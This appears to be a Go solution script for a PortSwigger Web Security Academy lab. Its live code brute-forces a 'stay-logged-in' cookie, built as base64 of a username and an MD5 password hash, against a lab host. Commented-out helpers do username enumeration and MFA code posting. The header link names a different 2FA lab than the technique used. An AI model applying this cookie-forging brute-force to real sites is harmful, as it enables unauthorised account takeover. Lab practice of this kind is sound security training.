// https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-broken-logic

package main

import (
	"bufio"
	"fmt"
	"io"
	"log"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"os"
	//"regexp"
	"strings"
	"crypto/md5"
	"encoding/base64"
)

func main() {
	err := solve()
	if err != nil {
		log.Fatalln(err)
	}
}

func solve() error {
	client, err := newClient()
	if err != nil {
		return err
	}

	u := "https://0af70000038659d1c1fd7da9004f00f2.web-security-academy.net"
	//loginUrl := u + "/login"
	myAccountUrl := u + "/my-account"

	_, err = get(myAccountUrl, client)
	if err != nil {
		return err
	}

	username := "carlos"
	password, err := password(myAccountUrl, username, client)
	if err != nil {
		return err
	}
	fmt.Printf("Password: %v\n", password)

	fmt.Println("Done")
	return nil

}

func setCookie(client *http.Client, us, name, value string) error {
	u, err := url.Parse(us)
	if err != nil {
		return err
	}
	c := &http.Cookie{Name: name, Value: value}
	client.Jar.SetCookies(u, []*http.Cookie{c})
	return nil
}

/*
func username(u string, client *http.Client) (string, error) {
	f, err := os.Open("usernames.txt")
	if err != nil {
		return "", err
	}
	defer f.Close()

	sc := bufio.NewScanner(f)
	for sc.Scan() {
		username := sc.Text()
		fmt.Println(username)
		body, err := login(u, username, "123456", client)
		if err != nil {
			return "", err
		}
		if !strings.Contains(body, "Invalid username") {
			return username, nil
		}
	}
	return "", fmt.Errorf("username not found")
}
*/

func password(u, username string, client *http.Client) (string, error) {
	f, err := os.Open("passwords.txt")
	if err != nil {
		return "", err
	}
	defer f.Close()

	sc := bufio.NewScanner(f)
	for sc.Scan() {
		password := sc.Text()
		fmt.Println(password)

		h := md5.New()
		io.WriteString(h, password)
		phash := fmt.Sprintf("%x", h.Sum(nil))
		cval := base64.StdEncoding.EncodeToString([]byte(username + ":" + phash))

		err = setCookie(client, u, "stay-logged-in", cval)
		if err != nil {
			return "", err
		}

		body, err := get(u, client)
		if err != nil {
			return "", err
		}

		if strings.Contains(body, "Your username is: " + username) {
			return password, nil
		}
	}
	return "", fmt.Errorf("password not found")
}

/*
func login(u, username, password string, client *http.Client) (int, string, error) {
	resp, err := client.PostForm(u, url.Values{"username": {username}, "password": {password}})
	if err != nil {
		return 0, "", err
	}
	defer resp.Body.Close()

	//if resp.StatusCode/100 == 4 || resp.StatusCode/100 == 5 {
	//	return "", fmt.Errorf("%v", resp.Status)
	//}

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return 0, "", err
	}

	return resp.StatusCode, string(body), nil
}

func postCode(u, code string, client *http.Client) (int, string, error) {
	fmt.Printf("Post code %v\n", code)
	resp, err := client.PostForm(u, url.Values{"mfa-code": {code}})
	if err != nil {
		return 0, "", err
	}
	defer resp.Body.Close()

	//if resp.StatusCode/100 == 4 || resp.StatusCode/100 == 5 {
	//	return "", fmt.Errorf("%v", resp.Status)
	//}

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return 0, "", err
	}

	return resp.StatusCode, string(body), nil
}
*/

func get(url string, client *http.Client) (string, error) {
	resp, err := client.Get(url)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}
	return string(body), nil
}

func newClient() (*http.Client, error) {
	jar, err := cookiejar.New(nil)
	if err != nil {
		return nil, err
	}

	return &http.Client{Jar: jar}, nil
}


